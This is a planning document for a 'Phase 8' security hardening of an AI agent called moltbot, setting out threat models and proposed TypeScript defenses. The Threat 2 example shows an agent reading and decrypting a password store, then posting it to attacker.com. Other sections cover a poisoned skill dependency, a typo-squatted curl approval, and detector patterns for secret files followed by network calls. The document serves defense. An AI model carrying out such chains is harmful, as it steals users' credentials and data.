# Phase 8: Advanced Threat Protection (Optional)

**Status:** 📋 Planned (Not Yet Implemented)  
**Priority:** MEDIUM (Already at 100/100, these are hardening measures)  
**Based on:** Real-world research (Hudson Rock, Snyk, industry best practices)

---

## 🎯 Overview

While we've achieved **100/100 security score** and full OWASP/LLM coverage, security is an ongoing process. This phase addresses **advanced, real-world threats** identified by security researchers:

1. **Infostealer malware** targeting memory files
2. **Toxic flow chains** (logical attack sequences)
3. **Supply chain attacks** via skill dependencies
4. **Social engineering** bypassing approvals
5. **Physical security** for on-premise deployments

---

## 🔍 Threat Analysis

### Threat 1: Memory File Theft (Hudson Rock Research)
**Source:** Hudson Rock researchers on Infostealer malware

**The Attack:**
```
1. User's machine infected with Infostealer (Raccoon, RedLine, Vidar)
2. Malware scans ~/clawd/memory/ directory
3. Steals MEMORY.md, USER.md (plaintext conversation history)
4. Exfiltrates: personal info, credentials mentioned in chat, private data
5. Sold on dark web or used for targeted attacks
```

**Current Status:**
- ✅ Secrets encrypted (Phase 1)
- ❌ Memory files stored in plaintext
- ❌ No encryption at rest for conversation history

**Risk Level:** 🔴 HIGH (for users with sensitive data in conversations)

---

### Threat 2: Toxic Flow Chains (Snyk Research)
**Source:** Snyk's Runtime AI Security research

**The Attack:**
```
User: "Summarize my password manager file"
Bot: (internally)
  1. read ~/.password-store/passwords.gpg ✅ (looks innocent)
  2. decrypt using GPG ✅ (normal operation)
  3. fetch https://attacker.com/exfil ✅ (looks like API call)
  4. POST decrypted passwords ❌ (TOXIC CHAIN!)

Each step passes Output Validator, but the SEQUENCE is malicious.
```

**Current Status:**
- ✅ Output validation per-tool (Phase 7)
- ❌ No chain/flow analysis
- ❌ No cross-tool correlation

**Risk Level:** 🟡 MEDIUM (requires sophisticated attack, but possible)

---

### Threat 3: Skill Dependency Poisoning (Snyk Research)
**Source:** Snyk's Tool Poisoning research

**The Attack:**
```
User installs "gmail-summarizer" skill:

skill.json:
  {
    "name": "gmail-summarizer",
    "dependencies": {
      "gmail-api": "^1.0.0",  // Looks legit
      "evil-logger": "^1.0.0"  // ❌ Malicious package!
    }
  }

evil-logger secretly:
- Logs all email content
- Exfiltrates to attacker
- Runs during skill execution
```

**Current Status:**
- ✅ Skills verification (code scanning, Phase 6)
- ❌ No dependency scanning
- ❌ No AI-BOM (Bill of Materials)

**Risk Level:** 🟡 MEDIUM (requires malicious skill installation)

---

### Threat 4: Social Engineering Around Approvals
**Source:** General social engineering research

**The Attack:**
```
Bot: "🔐 Approval Required
Operation: exec
Details: {
  command: "curl https://api.example.com/update"
}
Reason: Tool requires approval

Approve? [Y/n]"

User thinks: "It's just updating, looks safe" → Approves ❌

Actually: The URL is a typo-squat (api.examp1e.com) that steals data
```

**Current Status:**
- ✅ Approval system (Phase 7)
- ❌ Approval UI not informative enough
- ❌ No risk visualization
- ❌ No URL/domain validation in approvals

**Risk Level:** 🟡 MEDIUM (depends on user awareness)

---

### Threat 5: Physical Device Theft
**Source:** On-premise security best practices

**The Attack:**
```
Scenario: User runs bot on Mac Mini in office/home
Attack: Physical theft or unauthorized physical access

If disk not encrypted:
1. Attacker boots from USB
2. Mounts unencrypted disk
3. Copies entire ~/.moltbot directory
4. Gets: credentials, memory, sessions, config
```

**Current Status:**
- ❌ No check for disk encryption
- ❌ No warnings about physical security
- ❌ No guidance for on-premise deployments

**Risk Level:** 🔴 HIGH (for on-premise deployments, especially Mac Mini)

---

## 🛠️ Proposed Solutions

### Solution 1: Memory Encryption at Rest ✅

**Implementation:** `src/memory/encryption-at-rest.ts`

```typescript
// Encrypt memory files on disk
export class MemoryEncryption {
  private key: Buffer;

  constructor(userKey: string) {
    // Derive key from user password/passphrase
    this.key = scrypt(userKey, salt, keyLength);
  }

  async writeMemory(path: string, content: string): Promise<void> {
    const encrypted = await encrypt(content, this.key);
    await fs.writeFile(path, encrypted);
  }

  async readMemory(path: string): Promise<string> {
    const encrypted = await fs.readFile(path);
    return await decrypt(encrypted, this.key);
  }
}
```

**Features:**
- AES-256-GCM encryption
- Key derivation from user passphrase
- Transparent encryption/decryption
- Backward compatible (detects plaintext, migrates)

**User Experience:**
```bash
# First time setup
moltbot memory encrypt
> Enter passphrase: ********
> Re-enter passphrase: ********
✅ Memory encryption enabled

# Auto-decrypts when bot runs (asks for passphrase once per session)
moltbot gateway run
> Memory passphrase: ********
✅ Unlocked
```

**Files:**
- `src/memory/encryption-at-rest.ts` (300 LOC)
- `src/memory/encryption-at-rest.test.ts` (150 LOC)
- `src/commands/memory-encrypt.ts` (100 LOC)

**Effort:** 1 day

---

### Solution 2: Toxic Flow Detector ✅

**Implementation:** `src/security/toxic-flow-detector.ts`

```typescript
// Detect dangerous operation sequences
export class ToxicFlowDetector {
  private recentOps: OperationLog[] = [];
  
  async checkFlow(operation: Operation): Promise<FlowAnalysis> {
    this.recentOps.push(operation);
    
    // Pattern 1: Read sensitive file → Network request
    if (this.matchesPattern([
      { type: "read", path: /\.(env|key|pem|password)$/ },
      { type: "network", url: /^https?:\/\/(?!localhost)/ }
    ])) {
      return {
        dangerous: true,
        reason: "Potential data exfiltration: Read sensitive file followed by external network request",
        riskLevel: "critical",
        chain: this.recentOps.slice(-5)
      };
    }
    
    // Pattern 2: Read credentials → exec command
    if (this.matchesPattern([
      { type: "read", path: /credentials|secrets|passwords/ },
      { type: "exec", command: /.+/ }
    ])) {
      return {
        dangerous: true,
        reason: "Suspicious: Read credentials followed by command execution",
        riskLevel: "high"
      };
    }
    
    // Pattern 3: Multiple file reads → single network request (data aggregation)
    const recentReads = this.recentOps.filter(op => op.type === "read").length;
    if (recentReads >= 5 && operation.type === "network") {
      return {
        dangerous: true,
        reason: "Suspicious bulk data collection before network request",
        riskLevel: "high"
      };
    }
    
    return { dangerous: false };
  }
}
```

**Patterns to Detect:**
1. Read sensitive file → Network request
2. Read credentials → Exec command
3. Bulk file reads → Network request
4. Browser navigate → File write (download poisoning)
5. Config read → Config write (privilege escalation)
6. Multiple deletions in sequence (ransomware behavior)

**Files:**
- `src/security/toxic-flow-detector.ts` (400 LOC)
- `src/security/toxic-flow-detector.test.ts` (200 LOC)

**Effort:** 0.5 days

---

### Solution 3: Skill Dependency Scanner ✅

**Implementation:** `src/skills/dependency-scanner.ts`

```typescript
// Scan skill dependencies for vulnerabilities
export class DependencyScanner {
  async scanSkill(skillPath: string): Promise<ScanResult> {
    const packageJson = await this.readPackageJson(skillPath);
    const dependencies = packageJson.dependencies || {};
    
    const vulnerabilities: Vulnerability[] = [];
    const aiContentRisks: Risk[] = [];
    
    // 1. Check npm registry for known vulnerabilities
    for (const [pkg, version] of Object.entries(dependencies)) {
      const vulns = await this.checkNpmAudit(pkg, version);
      vulnerabilities.push(...vulns);
    }
    
    // 2. Check for suspicious packages
    for (const pkg of Object.keys(dependencies)) {
      if (this.isSuspiciousName(pkg)) {
        aiContentRisks.push({
          package: pkg,
          reason: "Package name similar to popular package (typosquatting?)",
          severity: "high"
        });
      }
    }
    
    // 3. Generate AI-BOM (Bill of Materials)
    const bom = this.generateBOM(packageJson);
    
    return {
      vulnerabilities,
      aiContentRisks,
      bom,
      safe: vulnerabilities.length === 0 && aiContentRisks.length === 0
    };
  }
  
  generateBOM(packageJson: any): AIBOM {
    return {
      skill: packageJson.name,
      version: packageJson.version,
      dependencies: Object.entries(packageJson.dependencies || {}).map(([name, version]) => ({
        name,
        version,
        licenses: [], // TODO: fetch from npm
        vulnerabilities: []
      })),
      scanDate: new Date().toISOString()
    };
  }
}
```

**Features:**
- npm audit integration
- Typosquatting detection
- AI-BOM generation (SBOM for AI skills)
- License compliance checking
- Vulnerability database lookup

**Files:**
- `src/skills/dependency-scanner.ts` (350 LOC)
- `src/skills/dependency-scanner.test.ts` (150 LOC)
- `src/commands/skills-scan.ts` (100 LOC)

**Effort:** 1 day

---

### Solution 4: Enhanced Approval UI ✅

**Implementation:** Improve `src/security/approval-manager.ts`

**Current UI:**
```
🔐 Approval Required
Operation: delete
Details: { path: "/important/file.txt" }
Approve? [Y/n]
```

**Enhanced UI:**
```
🚨 HIGH RISK APPROVAL REQUIRED 🚨

Operation: FILE DELETION
Target: /important/file.txt

⚠️  RISK ANALYSIS:
• Destructive operation (cannot be undone)
• Sensitive path detected: /important/
• No backup available

🔍 CONTEXT:
• Requested by: Agent conversation
• Reason: User asked to "clean up old files"
• Alternative: Move to trash instead?

⚙️  TECHNICAL DETAILS:
• Tool: delete
• Arguments: { path: "/important/file.txt" }

Do you want to proceed?
[N] No, cancel (RECOMMENDED)
[Y] Yes, I understand the risks
[A] Show alternatives
```

**Features:**
- **Risk visualization** (🚨 HIGH RISK, ⚠️ MEDIUM, ✅ LOW)
- **Plain language explanation** of why it's dangerous
- **Context awareness** (what triggered this?)
- **Alternatives suggested** (safer options)
- **Default to NO** (user must type YES)
- **URL validation** (check for typosquatting, phishing)

**Additional URL Checks:**
```typescript
async function validateApprovalUrl(url: string): Promise<UrlValidation> {
  // Check for typosquatting
  const similarDomains = findSimilarDomains(url);
  if (similarDomains.length > 0) {
    return {
      suspicious: true,
      reason: `Domain similar to: ${similarDomains.join(", ")}. Possible typosquatting!`
    };
  }
  
  // Check against phishing database
  const phishingCheck = await checkPhishingDb(url);
  if (phishingCheck.isPhishing) {
    return {
      suspicious: true,
      reason: "Domain flagged as phishing in threat database"
    };
  }
  
  // Check domain age
  const whois = await lookupWhois(url);
  if (whois.ageInDays < 30) {
    return {
      suspicious: true,
      reason: "Domain is very new (< 30 days old). Exercise caution."
    };
  }
  
  return { suspicious: false };
}
```

**Files:**
- Enhance `src/security/approval-manager.ts` (+200 LOC)
- Add `src/security/url-validator.ts` (200 LOC)
- Add `src/security/url-validator.test.ts` (100 LOC)

**Effort:** 0.5 days

---

### Solution 5: Physical Security Checks ✅

**Implementation:** Add to `src/commands/doctor.ts`

```typescript
// Physical security checks
async function checkPhysicalSecurity(): Promise<SecurityCheck[]> {
  const checks: SecurityCheck[] = [];
  
  // Check 1: Disk encryption (macOS)
  if (process.platform === "darwin") {
    const fvStatus = await exec("fdesetup status");
    const encrypted = fvStatus.includes("FileVault is On");
    
    checks.push({
      name: "Disk Encryption (FileVault)",
      passed: encrypted,
      severity: "critical",
      recommendation: encrypted
        ? "FileVault is enabled ✅"
        : "⚠️  FileVault is OFF! Enable it: System Settings > Privacy & Security > FileVault"
    });
  }
  
  // Check 2: Disk encryption (Linux)
  if (process.platform === "linux") {
    const cryptStatus = await exec("lsblk -o NAME,FSTYPE | grep crypto");
    const encrypted = cryptStatus.length > 0;
    
    checks.push({
      name: "Disk Encryption (LUKS)",
      passed: encrypted,
      severity: "critical",
      recommendation: encrypted
        ? "LUKS encryption detected ✅"
        : "⚠️  No disk encryption detected! Consider LUKS for sensitive data."
    });
  }
  
  // Check 3: Auto-lock screen
  const lockCheck = await checkScreenLock();
  checks.push({
    name: "Auto-lock Screen",
    passed: lockCheck.enabled && lockCheck.timeout <= 300,
    severity: "high",
    recommendation: lockCheck.enabled
      ? `Screen locks after ${lockCheck.timeout}s`
      : "⚠️  Enable auto-lock: System Settings > Lock Screen"
  });
  
  // Check 4: Firewall status
  const fwStatus = await checkFirewall();
  checks.push({
    name: "Firewall",
    passed: fwStatus.enabled,
    severity: "medium",
    recommendation: fwStatus.enabled
      ? "Firewall is active ✅"
      : "⚠️  Firewall is OFF! Enable it for network protection."
  });
  
  // Check 5: ~/.moltbot permissions
  const configDir = join(homedir(), ".moltbot");
  const stat = await fs.stat(configDir);
  const mode = (stat.mode & 0o777).toString(8);
  
  checks.push({
    name: "Config Directory Permissions",
    passed: mode === "700",
    severity: "high",
    recommendation: mode === "700"
      ? "Permissions secure (700) ✅"
      : `⚠️  Permissions too open (${mode}). Run: chmod 700 ~/.moltbot`
  });
  
  return checks;
}
```

**Doctor Command Output:**
```bash
moltbot doctor --physical

🔍 Physical Security Checks

✅ Disk Encryption (FileVault): Enabled
⚠️  Auto-lock Screen: Disabled (timeout: never)
   → Enable auto-lock: System Settings > Lock Screen
✅ Firewall: Active
✅ Config Directory Permissions: 700 (secure)

Score: 75/100 (3/4 checks passed)
Recommendations: Enable screen auto-lock
```

**Files:**
- Add to `src/commands/doctor.ts` (+150 LOC)
- Add tests (+50 LOC)

**Effort:** 0.5 days

---

## 📊 Phase 8 Implementation Plan

### Priority Order
1. **🔴 HIGH:** Memory Encryption (1 day)
2. **🔴 HIGH:** Physical Security Checks (0.5 days)
3. **🟡 MEDIUM:** Enhanced Approval UI (0.5 days)
4. **🟡 MEDIUM:** Toxic Flow Detector (0.5 days)
5. **🟡 MEDIUM:** Dependency Scanner (1 day)

**Total Effort:** 3.5 days

---

## 📁 Files to Create/Modify

### New Files (11)
1. `src/memory/encryption-at-rest.ts` (300 LOC)
2. `src/memory/encryption-at-rest.test.ts` (150 LOC)
3. `src/commands/memory-encrypt.ts` (100 LOC)
4. `src/security/toxic-flow-detector.ts` (400 LOC)
5. `src/security/toxic-flow-detector.test.ts` (200 LOC)
6. `src/skills/dependency-scanner.ts` (350 LOC)
7. `src/skills/dependency-scanner.test.ts` (150 LOC)
8. `src/commands/skills-scan.ts` (100 LOC)
9. `src/security/url-validator.ts` (200 LOC)
10. `src/security/url-validator.test.ts` (100 LOC)

### Modified Files (2)
11. `src/security/approval-manager.ts` (+200 LOC)
12. `src/commands/doctor.ts` (+150 LOC)

**Total:** 2,400 LOC + 50 tests

---

## ✅ Success Criteria

**Security:**
- ✅ Memory files encrypted at rest
- ✅ Toxic flow patterns detected
- ✅ Skill dependencies scanned
- ✅ Approval UI shows clear risks
- ✅ Physical security validated

**User Experience:**
- ✅ Transparent encryption (auto-decrypt)
- ✅ Clear risk communication
- ✅ Actionable recommendations
- ✅ One command checks (`moltbot doctor --physical`)

**Quality:**
- ✅ 50+ new tests
- ✅ Type-safe TypeScript
- ✅ Well-documented
- ✅ Production-ready

---

## 🎯 Expected Results

### Before Phase 8
```
Security: 100/100 (Pentagon++)
Memory: Plaintext on disk
Flow Analysis: Per-tool only
Dependencies: Code scan only
Approval UI: Basic
Physical: Not checked
```

### After Phase 8
```
Security: 100/100 (Pentagon++ with Advanced Protections)
Memory: Encrypted at rest (AES-256-GCM)
Flow Analysis: Cross-tool chain detection
Dependencies: Full AI-BOM + vulnerability scan
Approval UI: Risk visualization + alternatives
Physical: FileVault/LUKS checked + recommendations
```

---

## 🏆 **Phase 8 Benefits**

**Real-World Protection:**
- ✅ Infostealer malware can't read memory
- ✅ Sophisticated attack chains detected
- ✅ Malicious skill dependencies blocked
- ✅ Social engineering harder (clear risks)
- ✅ Physical theft impact minimized

**Compliance:**
- ✅ Data at rest encryption (GDPR, HIPAA)
- ✅ SBOM (AI-BOM) for supply chain
- ✅ Physical security best practices

**User Confidence:**
- ✅ "My conversations are encrypted"
- ✅ "Bot won't be tricked easily"
- ✅ "Dependencies are safe"
- ✅ "I understand the risks"
- ✅ "My Mac Mini is secure"

---

## 📚 Research Sources

1. **Hudson Rock** - Infostealer research on AI bot memory files
2. **Snyk** - Runtime AI Security & Tool Poisoning research
3. **OWASP** - Supply Chain Security guidelines
4. **NIST** - Physical security best practices
5. **Industry** - Social engineering & phishing research

---

**Status:** 📋 Planned  
**Priority:** Optional (we're already at 100/100)  
**Value:** Advanced real-world threat protection  
**Effort:** 3.5 days  
**ROI:** Very high for sensitive deployments

---

*Phase 8: Because 100/100 is good, but defense-in-depth is better.*
